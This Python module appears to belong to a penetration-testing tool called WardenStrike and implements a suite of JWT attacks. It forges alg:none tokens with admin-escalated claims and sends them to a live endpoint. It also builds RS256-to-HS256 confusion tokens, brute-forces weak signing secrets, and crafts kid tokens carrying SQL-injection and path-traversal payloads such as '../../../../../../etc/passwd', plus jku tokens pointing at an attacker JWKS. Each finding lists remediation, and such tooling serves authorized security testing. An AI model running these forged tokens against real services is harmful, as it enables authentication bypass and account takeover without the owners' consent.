"""
WardenStrike - JWT Attack Suite
Tests: alg:none, RS256→HS256 confusion, weak secret brute-force,
kid injection, jku/x5u SSRF, expiry bypass, claim manipulation.
"""

import base64
import hashlib
import hmac
import json
import re
import time
import urllib.request
import urllib.error
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

from wardenstrike.config import Config
from wardenstrike.utils.logger import get_logger

log = get_logger("jwt_attacks")


def b64_decode_padding(s: str) -> bytes:
    """Base64 URL decode with padding fix."""
    s = s.replace("-", "+").replace("_", "/")
    pad = 4 - len(s) % 4
    if pad != 4:
        s += "=" * pad
    return base64.b64decode(s)


def b64_encode_url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


@dataclass
class JWTFinding:
    attack: str
    severity: str
    details: dict = field(default_factory=dict)
    crafted_token: str = ""
    remediation: str = ""


class JWTAttackSuite:
    """
    Comprehensive JWT attack testing.
    Tests all known JWT vulnerabilities against a target endpoint.
    """

    COMMON_SECRETS = [
        "secret", "password", "123456", "test", "jwt_secret", "secret123",
        "change_me", "your-256-bit-secret", "supersecret", "token_secret",
        "mysecret", "jwttoken", "jwt123", "", "null", "undefined",
        "key", "private", "public", "signingkey", "accesstoken",
        "refresh", "app_secret", "app_key", "api_secret", "api_key",
        "CHANGE_ME", "PLEASE_CHANGE_THIS", "dev_secret", "prod_secret",
    ]

    def __init__(self, config: Config, ai=None):
        self.config = config
        self.ai = ai
        self.findings: list[JWTFinding] = []

    def _add(self, attack, severity, details=None, crafted_token="", remediation=""):
        f = JWTFinding(attack, severity, details or {}, crafted_token, remediation)
        self.findings.append(f)
        log.info(f"[JWT/{severity.upper()}] {attack}")

    # ─── JWT Parsing ──────────────────────────────────────────────

    @staticmethod
    def decode_jwt(token: str) -> tuple[dict, dict, str]:
        """Decode JWT without verification. Returns header, payload, signature."""
        parts = token.split(".")
        if len(parts) != 3:
            raise ValueError("Invalid JWT format")
        header = json.loads(b64_decode_padding(parts[0]))
        payload = json.loads(b64_decode_padding(parts[1]))
        return header, payload, parts[2]

    @staticmethod
    def encode_jwt_hs256(header: dict, payload: dict, secret: str) -> str:
        """Create a HS256-signed JWT."""
        h = b64_encode_url(json.dumps(header, separators=(",", ":")).encode())
        p = b64_encode_url(json.dumps(payload, separators=(",", ":")).encode())
        signing_input = f"{h}.{p}".encode()
        sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
        return f"{h}.{p}.{b64_encode_url(sig)}"

    # ─── alg:none ─────────────────────────────────────────────────

    def attack_alg_none(self, token: str) -> list[str]:
        """
        Forge JWT with alg:none (no signature required).
        Returns list of crafted tokens to test.
        """
        try:
            header, payload, _ = self.decode_jwt(token)
        except Exception:
            return []

        crafted_tokens = []
        none_variants = ["none", "None", "NONE", "nOnE"]

        for variant in none_variants:
            h = dict(header)
            h["alg"] = variant
            h_enc = b64_encode_url(json.dumps(h, separators=(",", ":")).encode())
            p_enc = b64_encode_url(json.dumps(payload, separators=(",", ":")).encode())
            crafted_tokens.extend([
                f"{h_enc}.{p_enc}.",
                f"{h_enc}.{p_enc}",
            ])

        return crafted_tokens

    def test_alg_none(self, token: str, endpoint: str, cookie_name: str = None,
                      header_name: str = "Authorization") -> bool:
        """Test alg:none attack against an endpoint."""
        log.info("Testing alg:none attack...")

        try:
            header, payload, _ = self.decode_jwt(token)
        except Exception:
            return False

        # Modify payload - try to escalate privileges
        mod_payload = dict(payload)
        for admin_field in ["role", "roles", "admin", "is_admin", "privilege", "scope"]:
            if admin_field in mod_payload:
                if isinstance(mod_payload[admin_field], bool):
                    mod_payload[admin_field] = True
                elif isinstance(mod_payload[admin_field], str):
                    mod_payload[admin_field] = "admin"
                elif isinstance(mod_payload[admin_field], list):
                    mod_payload[admin_field] = ["admin"]

        # Fix expiry
        mod_payload["exp"] = int(time.time()) + 86400

        crafted = self.attack_alg_none(
            b64_encode_url(json.dumps(header).encode()) + "." +
            b64_encode_url(json.dumps(mod_payload).encode()) + ".sig"
        )

        for crafted_token in crafted[:4]:
            if cookie_name:
                req_headers = {"Cookie": f"{cookie_name}={crafted_token}",
                               "User-Agent": "WardenStrike/1.0"}
            else:
                req_headers = {header_name: f"Bearer {crafted_token}",
                               "User-Agent": "WardenStrike/1.0"}

            try:
                req = urllib.request.Request(endpoint, headers=req_headers)
                with urllib.request.urlopen(req, timeout=10) as resp:
                    if resp.status in (200, 201, 204):
                        self._add("JWT alg:none accepted — signature not verified",
                                  "critical",
                                  details={"endpoint": endpoint, "crafted_alg": "none",
                                           "original_alg": header.get("alg")},
                                  crafted_token=crafted_token,
                                  remediation="Reject JWT tokens with alg:none. Use a whitelist of allowed algorithms.")
                        return True
            except urllib.error.HTTPError as e:
                if e.code not in (401, 403):
                    # Got a non-auth error — might mean token was accepted
                    pass
            except Exception:
                pass

        return False

    # ─── RS256 → HS256 Confusion ──────────────────────────────────

    def attack_rsa_hmac_confusion(self, token: str, public_key: str) -> str | None:
        """
        RS256→HS256 algorithm confusion: sign token with public key as HMAC secret.
        This works when server accepts both RS256 and HS256.
        """
        try:
            header, payload, _ = self.decode_jwt(token)
            if header.get("alg") not in ("RS256", "RS384", "RS512"):
                return None

            # Modify header to HS256
            new_header = dict(header)
            new_header["alg"] = "HS256"
            # Remove kid if present (may cause issues)
            new_header.pop("kid", None)

            # Modify payload - escalate privileges
            mod_payload = dict(payload)
            mod_payload["exp"] = int(time.time()) + 86400
            for field in ["admin", "role", "is_admin"]:
                if field in mod_payload:
                    mod_payload[field] = True if isinstance(mod_payload[field], bool) else "admin"

            # Sign with public key as HMAC secret
            crafted = self.encode_jwt_hs256(new_header, mod_payload, public_key)

            self._add("JWT RS256→HS256 confusion token crafted",
                      "critical",
                      details={"original_alg": header.get("alg"), "attack_alg": "HS256"},
                      crafted_token=crafted,
                      remediation="Explicitly whitelist allowed algorithms on the server. Never allow algorithm negotiation.")
            return crafted

        except Exception as e:
            log.debug(f"RSA confusion error: {e}")
            return None

    # ─── Weak Secret Brute Force ──────────────────────────────────

    def brute_force_secret(self, token: str, wordlist: list[str] = None) -> str | None:
        """Brute-force JWT HS256/HS384/HS512 secret."""
        try:
            header, payload, sig = self.decode_jwt(token)
        except Exception:
            return None

        alg = header.get("alg", "")
        if not alg.startswith("HS"):
            return None

        alg_map = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }
        hash_func = alg_map.get(alg, hashlib.sha256)

        parts = token.split(".")
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        expected_sig = b64_decode_padding(parts[2])

        candidates = wordlist or self.COMMON_SECRETS

        # Also load from knowledge base
        kb_path = Path(__file__).parent.parent.parent / "knowledge" / "wordlists" / "jwt_secrets.txt"
        if kb_path.exists():
            candidates = candidates + kb_path.read_text().strip().split("\n")

        log.info(f"JWT brute-force: testing {len(candidates)} secrets...")

        for secret in candidates:
            sig_attempt = hmac.new(secret.encode(), signing_input, hash_func).digest()
            if hmac.compare_digest(sig_attempt, expected_sig):
                self._add(f"JWT signed with weak/common secret: '{secret}'",
                          "critical",
                          details={"secret": secret, "algorithm": alg},
                          remediation="Use a cryptographically random secret of at least 256 bits")
                log.warning(f"[!] JWT secret found: '{secret}'")
                return secret

        return None

    # ─── kid injection ────────────────────────────────────────────

    def attack_kid_injection(self, token: str) -> list[dict]:
        """
        Test kid (Key ID) header injection attacks:
        - Path traversal to known files
        - SQL injection in kid
        - SSRF via kid
        """
        try:
            header, payload, _ = self.decode_jwt(token)
        except Exception:
            return []

        results = []
        attacks = [
            # SQLi in kid
            ("kid_sqli", "' UNION SELECT 'wardenstrike'--",
             "JWT kid SQL injection — attacker controls signing key via SQLi in database",
             "critical"),
            # Path traversal to /dev/null (empty secret)
            ("kid_path_traversal_devnull", "../../../../../../dev/null",
             "JWT kid path traversal to /dev/null — empty signing key",
             "critical"),
            # Path traversal to known static file
            ("kid_path_traversal_passwd", "../../../../../../etc/passwd",
             "JWT kid path traversal — file contents used as signing key",
             "high"),
        ]

        for attack_id, kid_value, desc, severity in attacks:
            h = dict(header)
            h["kid"] = kid_value

            # For /dev/null or SQLi → try signing with empty or predictable secret
            secrets_to_try = ["", "wardenstrike", "null", "None"]
            for secret in secrets_to_try:
                crafted = self.encode_jwt_hs256(h, payload, secret)
                self._add(f"Crafted JWT for {attack_id}", severity,
                          details={"kid": kid_value, "secret_used": secret},
                          crafted_token=crafted,
                          remediation="Validate kid parameter strictly. Never use kid as a path or SQL lookup without sanitization.")
                results.append({"attack": attack_id, "token": crafted})

        return results

    # ─── jku/x5u SSRF ─────────────────────────────────────────────

    def build_jku_ssrf_token(self, token: str, ssrf_url: str) -> str | None:
        """
        Build a JWT with a jku/x5u pointing to attacker-controlled JWKS.
        Requires attacker to host a JWKS endpoint.
        """
        try:
            header, payload, _ = self.decode_jwt(token)
        except Exception:
            return None

        h = dict(header)
        h["jku"] = ssrf_url  # Points to attacker's JWKS
        h.pop("kid", None)

        self._add("JWT jku SSRF attack vector crafted",
                  "critical",
                  details={"jku": ssrf_url},
                  remediation="Validate jku/x5u against a strict whitelist of trusted JWKS endpoints")

        # Note: actual signing requires generating RSA keys, documented as manual step
        crafted_header = b64_encode_url(json.dumps(h, separators=(",", ":")).encode())
        crafted_payload = b64_encode_url(json.dumps(payload, separators=(",", ":")).encode())
        return f"{crafted_header}.{crafted_payload}.[SIGN_WITH_ATTACKER_RSA_KEY]"

    # ─── Claim manipulation ───────────────────────────────────────

    def check_expiry_bypass(self, token: str) -> dict:
        """Analyze token for expiry issues."""
        try:
            header, payload, sig = self.decode_jwt(token)
        except Exception:
            return {}

        result = {"issues": []}
        now = int(time.time())

        exp = payload.get("exp")
        iat = payload.get("iat")
        nbf = payload.get("nbf")

        if not exp:
            self._add("JWT has no expiry (exp claim missing)",
                      "medium",
                      details={"payload": payload},
                      remediation="Always set an expiry (exp) claim. Recommended: 15-60 minutes for access tokens.")
            result["issues"].append("no_expiry")
        elif exp > now + 86400 * 30:
            self._add(f"JWT expiry is very long: {(exp-now)//86400} days",
                      "medium",
                      details={"exp_days": (exp - now) // 86400},
                      remediation="Shorten token lifetime. Access tokens: 15-60 min. Refresh tokens: 7-30 days.")
            result["issues"].append("long_expiry")

        if not iat:
            result["issues"].append("no_iat")

        # Check for sensitive claims
        sensitive = ["password", "secret", "ssn", "credit_card", "cvv", "pin"]
        for claim in payload:
            if any(s in claim.lower() for s in sensitive):
                self._add(f"Sensitive data in JWT payload: {claim}",
                          "high",
                          details={"claim": claim},
                          remediation="Never store sensitive data in JWT payload (it's base64-encoded, not encrypted)")
                result["issues"].append(f"sensitive_claim_{claim}")

        return result

    # ─── Full test ────────────────────────────────────────────────

    async def test_token(self, token: str, endpoint: str = None,
                          public_key: str = None,
                          custom_wordlist: list[str] = None) -> dict:
        """
        Run all JWT attacks against a given token (and optionally an endpoint).
        """
        log.info("Running full JWT attack suite...")
        self.findings.clear()

        try:
            header, payload, sig = self.decode_jwt(token)
        except ValueError as e:
            return {"error": str(e)}

        results = {
            "header": header,
            "payload": payload,
            "algorithm": header.get("alg", "unknown"),
            "expiry_analysis": self.check_expiry_bypass(token),
            "none_tokens": self.attack_alg_none(token),
            "kid_attacks": self.attack_kid_injection(token),
        }

        # Brute force
        found_secret = self.brute_force_secret(token, custom_wordlist)
        results["secret_found"] = found_secret

        if found_secret:
            results["cracked_token"] = self.encode_jwt_hs256(
                {**header, "alg": "HS256"},
                {**payload, "exp": int(time.time()) + 86400, "admin": True},
                found_secret
            )

        # RSA confusion
        if public_key:
            results["rsa_confusion_token"] = self.attack_rsa_hmac_confusion(token, public_key)

        # Live endpoint testing
        if endpoint:
            results["alg_none_bypass"] = self.test_alg_none(token, endpoint)

        results["findings"] = [vars(f) for f in self.findings]
        results["summary"] = {
            "total_issues": len(self.findings),
            "critical": sum(1 for f in self.findings if f.severity == "critical"),
            "high": sum(1 for f in self.findings if f.severity == "high"),
        }

        return results
